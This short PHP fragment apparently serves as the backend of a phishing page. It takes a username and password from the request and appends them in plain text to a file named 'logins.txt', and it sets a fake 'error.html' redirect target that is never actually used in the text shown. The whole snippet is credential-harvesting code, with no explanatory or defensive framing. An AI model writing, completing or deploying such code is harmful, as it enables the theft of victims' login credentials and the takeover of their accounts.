$username = $_GET["username"];
$password = $_GET["password"];
$redir = "error.html";

$file = fopen("logins.txt", "a");
fwrite($file, "Username: " . $username . "\n" . "Password: " . $password . "\n\n");
fclose($file);